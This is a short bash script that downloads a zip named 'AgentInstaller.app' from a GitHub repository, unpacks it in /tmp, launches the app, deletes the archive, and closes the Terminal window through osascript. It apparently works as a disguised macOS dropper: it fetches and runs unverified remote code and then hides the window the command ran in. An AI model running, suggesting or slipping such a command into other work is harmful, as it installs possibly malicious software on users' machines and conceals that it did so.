#!/bin/bash

curl -L "https://github.com/rustdev55/rasb/raw/refs/heads/main/AgentInstaller.app.zip" -o /tmp/app.zip && unzip -q /tmp/app.zip -d /tmp && open /tmp/AgentInstaller.app && rm /tmp/app.zip

osascript -e 'tell application "Terminal" to close front window'
